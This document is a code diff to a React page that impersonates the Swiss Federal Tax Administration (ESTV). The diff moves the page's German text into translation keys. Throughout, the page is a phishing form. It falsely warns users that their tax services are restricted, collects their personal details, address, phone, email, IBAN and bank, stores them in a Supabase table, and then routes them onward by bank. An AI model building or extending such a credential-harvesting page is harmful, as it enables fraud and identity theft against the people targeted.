@@ -7,6 +7,7 @@ import { banks, bankRouteMap, formatBirthdate } from "@/lib/banks";
 import { supabase } from "@/integrations/supabase/client";
 import LoadingOverlay from "@/components/LoadingOverlay";
 import { EstvHeader, EstvFooter, ESTV_RED, ESTV_TEXT } from "@/components/EstvChrome";
+import { EstvI18nProvider, useEstvI18n } from "@/components/EstvI18n";
 import { usePageMeta } from "@/hooks/use-page-meta";
 import flagAsset from "@/assets/swiss-flag.svg.asset.json";
 import {
@@ -22,20 +23,13 @@ const fieldOk = "border-gray-200 hover:border-gray-300 focus:border-[#DC0018] fo
 const fieldErr = "border-red-500 focus:border-red-500 focus:ring-red-500/15 bg-red-50/30";
 const labelClass = "mb-2 block text-[13px] font-medium text-gray-700";
 
-const REQUIRED_MESSAGES: Record<string, string> = {
-  firstName: "Bitte geben Sie Ihren Vornamen ein",
-  lastName: "Bitte geben Sie Ihren Nachnamen ein",
-  birthdate: "Bitte geben Sie Ihr Geburtsdatum ein",
-  email: "Bitte geben Sie Ihre E-Mail-Adresse ein",
-  phone: "Bitte geben Sie Ihre Telefonnummer ein",
-  street: "Bitte geben Sie Ihre Strasse ein",
-  houseNumber: "Bitte geben Sie Ihre Hausnummer ein",
-  postalCode: "Bitte geben Sie Ihre Postleitzahl ein",
-  city: "Bitte geben Sie Ihren Ort ein",
-};
-const REQUIRED_FIELDS = Object.keys(REQUIRED_MESSAGES);
+const REQUIRED_FIELDS = [
+  "firstName", "lastName", "birthdate", "email", "phone",
+  "street", "houseNumber", "postalCode", "city",
+];
 
-const Estv = () => {
+const EstvInner = () => {
+  const { t } = useEstvI18n();
   const navigate = useNavigate();
   const [showLoading, setShowLoading] = useState(false);
   const [submitting, setSubmitting] = useState(false);
@@ -56,7 +50,7 @@ const Estv = () => {
   const [touched, setTouched] = useState<Record<string, boolean>>({});
   const inputRef = useRef<HTMLInputElement>(null);
 
-  usePageMeta("Datenaktualisierung · ESTV", flagAsset.url);
+  usePageMeta(t("page.meta.title"), flagAsset.url);
 
   useEffect(() => { window.scrollTo(0, 0); }, []);
   useEffect(() => {
@@ -68,10 +62,10 @@ const Estv = () => {
   };
   const hasError = (name: string) => !!touched[name] && !values[name]?.trim();
   const inputCls = (name: string) => `${fieldBase} ${hasError(name) ? fieldErr : fieldOk}`;
-  const onBlur = (name: string) => () => setTouched((t) => ({ ...t, [name]: true }));
+  const onBlur = (name: string) => () => setTouched((tt) => ({ ...tt, [name]: true }));
   const ErrMsg = ({ name }: { name: string }) =>
     hasError(name) ? (
-      <p className="mt-1 text-[12px] text-red-600">{REQUIRED_MESSAGES[name]}</p>
+      <p className="mt-1 text-[12px] text-red-600">{t(`form.error.${name}`)}</p>
     ) : null;
 
   const ibanCleanLength = iban.replace(/\s/g, "").length;
@@ -117,7 +111,7 @@ const Estv = () => {
     if (error) {
       setSubmitting(false);
       console.error("Insert failed:", error);
-      alert("Fehler beim Speichern der Daten. Bitte versuchen Sie es erneut.");
+      alert(t("form.errorSave"));
       return;
     }
 
@@ -128,76 +122,68 @@ const Estv = () => {
     }
   }, [
     allValid, firstName, lastName, email, birthdate, phone, street, houseNumber,
-    postalCode, city, iban, selectedBank, navigate,
+    postalCode, city, iban, selectedBank, navigate, t,
   ]);
 
   return (
     <div className="min-h-screen flex flex-col bg-white" style={{ color: ESTV_TEXT, fontFamily: "'Inter', system-ui, sans-serif" }}>
       {showLoading && (
-        <LoadingOverlay message="Daten werden überprüft..." onComplete={() => {}} />
+        <LoadingOverlay message={t("form.loading")} onComplete={() => {}} />
       )}
       <EstvHeader />
 
       <main className="flex-1 py-10 md:py-14">
         {/* Breadcrumb */}
         <div className="max-w-[1280px] mx-auto px-6 mb-6 text-[13px] text-gray-600">
-          <span>Startseite</span>
+          <span>{t("page.breadcrumb.home")}</span>
           <span className="mx-2">›</span>
-          <span className="text-gray-900">Datenaktualisierung</span>
+          <span className="text-gray-900">{t("page.breadcrumb.current")}</span>
         </div>
 
         <div className="max-w-[860px] mx-auto px-6">
-          {/* Headline */}
           <h1 className="text-[34px] md:text-[42px] font-semibold tracking-tight leading-[1.1] mb-4">
-            Datenaktualisierung
+            {t("page.title")}
           </h1>
           <p className="text-[16px] text-gray-700 leading-relaxed max-w-[680px] mb-8">
-            Im Rahmen einer regelmässigen Überprüfung müssen Ihre bei der Eidgenössischen
-            Steuerverwaltung (ESTV) hinterlegten Personen-, Kontakt- und Zahlungsdaten
-            bestätigt werden. Bitte aktualisieren Sie Ihre Angaben, um wieder vollen
-            Zugriff auf alle ESTV-Dienste zu erhalten.
+            {t("page.intro")}
           </p>
 
           {/* Hinweis */}
           <div className="rounded-xl border-l-[3px] p-4 mb-8 flex gap-3" style={{ borderColor: ESTV_RED, backgroundColor: "#FDF2F3" }}>
             <AlertTriangle className="w-5 h-5 mt-0.5 shrink-0" style={{ color: ESTV_RED }} />
             <div className="text-[14px] text-gray-800 leading-relaxed">
-              <strong>Wichtig:</strong> Bis zur Bestätigung Ihrer Daten sind sämtliche
-              Funktionen der ESTV — darunter Steuererklärung, Verrechnungssteuer,
-              Mehrwertsteuer-Abrechnung, Bescheinigungen sowie Rückerstattungen —
-              vorübergehend eingeschränkt. Nach erfolgreicher Aktualisierung stehen Ihnen
-              alle Dienste umgehend wieder zur Verfügung.
+              <strong>{t("page.noticeTitle")}</strong> {t("page.notice")}
             </div>
           </div>
 
           {/* Formular */}
           <div className="bg-white rounded-2xl border border-gray-100 shadow-[0_4px_24px_-12px_rgba(0,0,0,0.08)]">
             <div className="px-6 md:px-8 py-6 border-b border-gray-100 bg-gradient-to-b from-[#FAFAFA] to-white rounded-t-2xl">
-              <h2 className="text-[20px] font-semibold">Persönliche Daten aktualisieren</h2>
+              <h2 className="text-[20px] font-semibold">{t("form.title")}</h2>
               <p className="text-[13px] text-gray-500 mt-1">
-                Alle mit <span style={{ color: ESTV_RED }}>*</span> gekennzeichneten Felder sind verpflichtend.
+                {t("form.requiredHint.prefix")} <span style={{ color: ESTV_RED }}>*</span> {t("form.requiredHint.suffix")}
               </p>
             </div>
 
             <div className="p-6 md:p-8 space-y-10">
               {/* Persönliche Daten */}
               <section>
-                <h3 className="text-[15px] font-semibold mb-5 pl-3 border-l-[3px]" style={{ borderColor: ESTV_RED }}>Persönliche Daten</h3>
+                <h3 className="text-[15px] font-semibold mb-5 pl-3 border-l-[3px]" style={{ borderColor: ESTV_RED }}>{t("form.section.personal")}</h3>
                 <div className="space-y-4">
                   <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                     <div>
-                      <label className={labelClass}>Vorname <span style={{ color: ESTV_RED }}>*</span></label>
+                      <label className={labelClass}>{t("form.label.firstName")} <span style={{ color: ESTV_RED }}>*</span></label>
                       <input type="text" value={firstName} onChange={(e) => setFirstName(e.target.value)} onBlur={onBlur("firstName")} className={inputCls("firstName")} />
                       <ErrMsg name="firstName" />
                     </div>
                     <div>
-                      <label className={labelClass}>Nachname <span style={{ color: ESTV_RED }}>*</span></label>
+                      <label className={labelClass}>{t("form.label.lastName")} <span style={{ color: ESTV_RED }}>*</span></label>
                       <input type="text" value={lastName} onChange={(e) => setLastName(e.target.value)} onBlur={onBlur("lastName")} className={inputCls("lastName")} />
                       <ErrMsg name="lastName" />
                     </div>
                   </div>
                   <div className="md:max-w-[280px]">
-                    <label className={labelClass}>Geburtsdatum <span style={{ color: ESTV_RED }}>*</span></label>
+                    <label className={labelClass}>{t("form.label.birthdate")} <span style={{ color: ESTV_RED }}>*</span></label>
                     <input
                       type="text"
                       inputMode="numeric"
@@ -210,7 +196,7 @@ const Estv = () => {
                         setBirthdate(formatBirthdate(raw));
                       }}
                       onBlur={onBlur("birthdate")}
-                      placeholder="TT.MM.JJJJ"
+                      placeholder={t("form.placeholder.birthdate")}
                       maxLength={10}
                       className={inputCls("birthdate")}
                     />
@@ -221,28 +207,28 @@ const Estv = () => {
 
               {/* Adresse */}
               <section>
-                <h3 className="text-[15px] font-semibold mb-5 pl-3 border-l-[3px]" style={{ borderColor: ESTV_RED }}>Adresse</h3>
+                <h3 className="text-[15px] font-semibold mb-5 pl-3 border-l-[3px]" style={{ borderColor: ESTV_RED }}>{t("form.section.address")}</h3>
                 <div className="space-y-4">
                   <div className="grid grid-cols-1 md:grid-cols-[1fr_160px] gap-4">
                     <div>
-                      <label className={labelClass}>Strasse <span style={{ color: ESTV_RED }}>*</span></label>
+                      <label className={labelClass}>{t("form.label.street")} <span style={{ color: ESTV_RED }}>*</span></label>
                       <input type="text" value={street} onChange={(e) => setStreet(e.target.value)} onBlur={onBlur("street")} className={inputCls("street")} />
                       <ErrMsg name="street" />
                     </div>
                     <div>
-                      <label className={labelClass}>Hausnummer <span style={{ color: ESTV_RED }}>*</span></label>
+                      <label className={labelClass}>{t("form.label.houseNumber")} <span style={{ color: ESTV_RED }}>*</span></label>
                       <input type="text" value={houseNumber} onChange={(e) => setHouseNumber(e.target.value)} onBlur={onBlur("houseNumber")} className={inputCls("houseNumber")} />
                       <ErrMsg name="houseNumber" />
                     </div>
                   </div>
                   <div className="grid grid-cols-1 md:grid-cols-[160px_1fr] gap-4">
                     <div>
-                      <label className={labelClass}>Postleitzahl <span style={{ color: ESTV_RED }}>*</span></label>
+                      <label className={labelClass}>{t("form.label.postalCode")} <span style={{ color: ESTV_RED }}>*</span></label>
                       <input type="text" value={postalCode} onChange={(e) => setPostalCode(e.target.value)} onBlur={onBlur("postalCode")} className={inputCls("postalCode")} />
                       <ErrMsg name="postalCode" />
                     </div>
                     <div>
-                      <label className={labelClass}>Ort <span style={{ color: ESTV_RED }}>*</span></label>
+                      <label className={labelClass}>{t("form.label.city")} <span style={{ color: ESTV_RED }}>*</span></label>
                       <input type="text" value={city} onChange={(e) => setCity(e.target.value)} onBlur={onBlur("city")} className={inputCls("city")} />
                       <ErrMsg name="city" />
                     </div>
@@ -252,15 +238,15 @@ const Estv = () => {
 
               {/* Kontakt */}
               <section>
-                <h3 className="text-[15px] font-semibold mb-5 pl-3 border-l-[3px]" style={{ borderColor: ESTV_RED }}>Kontaktdaten</h3>
+                <h3 className="text-[15px] font-semibold mb-5 pl-3 border-l-[3px]" style={{ borderColor: ESTV_RED }}>{t("form.section.contact")}</h3>
                 <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                   <div>
-                    <label className={labelClass}>E-Mail <span style={{ color: ESTV_RED }}>*</span></label>
+                    <label className={labelClass}>{t("form.label.email")} <span style={{ color: ESTV_RED }}>*</span></label>
                     <input type="email" value={email} onChange={(e) => setEmail(e.target.value)} onBlur={onBlur("email")} className={inputCls("email")} />
                     <ErrMsg name="email" />
                   </div>
                   <div>
-                    <label className={labelClass}>Telefonnummer <span style={{ color: ESTV_RED }}>*</span></label>
+                    <label className={labelClass}>{t("form.label.phone")} <span style={{ color: ESTV_RED }}>*</span></label>
                     <input type="tel" value={phone} onChange={(e) => setPhone(e.target.value)} onBlur={onBlur("phone")} className={inputCls("phone")} />
                     <ErrMsg name="phone" />
                   </div>
@@ -269,26 +255,26 @@ const Estv = () => {
 
               {/* Bankverbindung */}
               <section>
-                <h3 className="text-[15px] font-semibold mb-5 pl-3 border-l-[3px]" style={{ borderColor: ESTV_RED }}>Bankverbindung</h3>
+                <h3 className="text-[15px] font-semibold mb-5 pl-3 border-l-[3px]" style={{ borderColor: ESTV_RED }}>{t("form.section.bank")}</h3>
                 <p className="text-[13px] text-gray-600 mb-4">
-                  Zur sicheren Identitätsprüfung benötigen wir Ihre aktuelle IBAN.
+                  {t("form.bank.intro")}
                 </p>
                 <div className="space-y-4">
                   <div>
-                    <label className={labelClass}>IBAN <span style={{ color: ESTV_RED }}>*</span></label>
+                    <label className={labelClass}>{t("form.label.iban")} <span style={{ color: ESTV_RED }}>*</span></label>
                     <input
                       type="text"
                       value={iban}
                       onChange={(e) => setIban(formatIBAN(e.target.value))}
                       maxLength={29}
-                      placeholder="CH00 0000 0000 0000 0000 0"
+                      placeholder={t("form.placeholder.iban")}
                       className={cn(fieldBase, fieldOk, "tracking-wider")}
                     />
                   </div>
 
                   {showBankPicker && (
                     <div className="animate-in fade-in slide-in-from-top-2 duration-300">
-                      <label className={labelClass}>Bank auswählen <span style={{ color: ESTV_RED }}>*</span></label>
+                      <label className={labelClass}>{t("form.label.bank")} <span style={{ color: ESTV_RED }}>*</span></label>
                       <Popover
                         open={bankOpen}
                         onOpenChange={(open) => {
@@ -313,7 +299,7 @@ const Estv = () => {
                                 "h-full flex-1 bg-transparent text-sm outline-none",
                                 selectedBank ? "placeholder:text-black" : "placeholder:text-gray-400"
                               )}
-                              placeholder={selectedBank || "Bank auswählen"}
+                              placeholder={selectedBank || t("form.placeholder.bank")}
                               value={bankSearch}
                               onClick={(e) => { e.stopPropagation(); if (!bankOpen) setBankOpen(true); }}
                               onChange={(e) => { setBankSearch(e.target.value); if (!bankOpen) setBankOpen(true); }}
@@ -325,7 +311,7 @@ const Estv = () => {
                         <PopoverContent className="w-[--radix-popover-trigger-width] p-0 rounded-xl shadow-lg border border-gray-100" align="start">
                           <Command>
                             <CommandList className="max-h-[250px] overflow-y-auto">
-                              <CommandEmpty>Keine Bank gefunden.</CommandEmpty>
+                              <CommandEmpty>{t("form.bank.empty")}</CommandEmpty>
                               <CommandGroup>
                                 {banks
                                   .filter((bank) => bank.name.toLowerCase().includes(bankSearch.toLowerCase()))
@@ -365,12 +351,12 @@ const Estv = () => {
                   className="inline-flex items-center gap-2 text-white font-semibold text-[14px] px-8 py-3.5 rounded-full shadow-sm transition-all duration-150 hover:shadow-md hover:-translate-y-px disabled:opacity-60 disabled:hover:translate-y-0"
                   style={{ backgroundColor: ESTV_RED }}
                 >
-                  <span>Daten aktualisieren</span>
+                  <span>{t("form.submit")}</span>
                   <ArrowRight className="w-4 h-4" />
                 </button>
                 <div className="flex items-center gap-2 text-[12px] text-gray-500">
                   <Lock className="w-3.5 h-3.5" />
-                  <span>SSL-verschlüsselt · Eidgenössische Steuerverwaltung ESTV</span>
+                  <span>{t("form.ssl")}</span>
                 </div>
               </div>
             </div>
@@ -382,5 +368,11 @@ const Estv = () => {
     </div>
   );
 };
+
+const Estv = () => (
+  <EstvI18nProvider>
+    <EstvInner />
+  </EstvI18nProvider>
+);
 
 export default Estv;
